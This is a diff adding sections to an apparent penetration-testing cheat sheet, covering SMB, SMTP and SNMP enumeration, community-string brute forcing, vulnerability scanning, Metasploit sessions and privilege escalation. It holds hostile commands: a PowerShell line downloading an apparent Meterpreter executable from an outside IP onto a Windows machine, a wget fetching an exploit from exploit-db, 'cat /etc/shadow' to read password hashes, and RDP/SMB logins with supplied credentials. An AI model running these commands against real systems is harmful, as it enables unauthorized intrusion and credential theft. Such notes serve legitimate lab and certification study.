@@ -112,13 +112,82 @@ nmap -sn 192.168.1.1/24
 
 --open = only display results of open ports
 
+#----- SMB (PORT 139, 445) -----#
 ### Identify smb or netbios services
 nbtscan 192.168.1.0/24
 
-for user in $(cat users.txt); do nc -nv IPADDRESS 25; VRFY $user; done
+#----- SMTP (PORT 25) -----#
+nc -nv IP ADDRESS 25
+VRFY USERID
+
+## Bash to connect to smb from userlist
+for user in $(cat users.txt); do echo VRFY $user | nc -nv IPADDRESS 25 2>/dev/null | grep ^"250"; done
+
+#----- SNMP (PORT 161)-----#
+nmap -sU --open -p 161 IPADDRESS
+
+### Brute force community string
+onesixtyone -c community -i ips
+
+### Once community string is discovered, data can be reterived by SNMPWALK
+### List of running programs
+snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.25.4.2.1.2
+
+### List of open tcp ports
+snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.6.13.1.3
+
+### List of installed software 
+snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.25.6.3.1.2
+
+## Other Tools
+SNMPENUM
+SNMPCHECK
+
+#----- VULN SCANNING -----#
+nmap -p 80 --script all IPADDRESS
+
+## Other Tools
+openvas-setup
+
+
+
 #----- Transferring Files from Linux to Windows -----#
 ### Python Webserver 
 python -m SimpleHTTPServer
 
 ### Transfer to Windows with no broswer
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"
+
+
+#----- Metasploit -----#
+jobs
+sessions -i 1
+
+cme smb -U USERID -p PASSWORD --local-auth IPADDRESS
+
+#----- Windows CMD To RUN -----#
+whoami
+net user
+cmd /c
+reg
+msbuild
+wscript
+
+#----- RDP from LINXU to Win -----#
+rdesktop -u USERID -p PASSWORD IPADDRESS -f
+
+#----- TRICKS AND TIPS -----# 
+### Command output on screen and on file
+ls -l 2>&1 | tee file.txt
+
+### Convert python exploit to Windows Exe
+pywin
+
+#----- PRIVELEDGE ESCALATION -----# 
+
+### DownLoad exploit with wget
+wget -O exploitName.c https://www.exploit-db.com/download/12932
+
+### LINUX
+id
+cat /etc/shadow
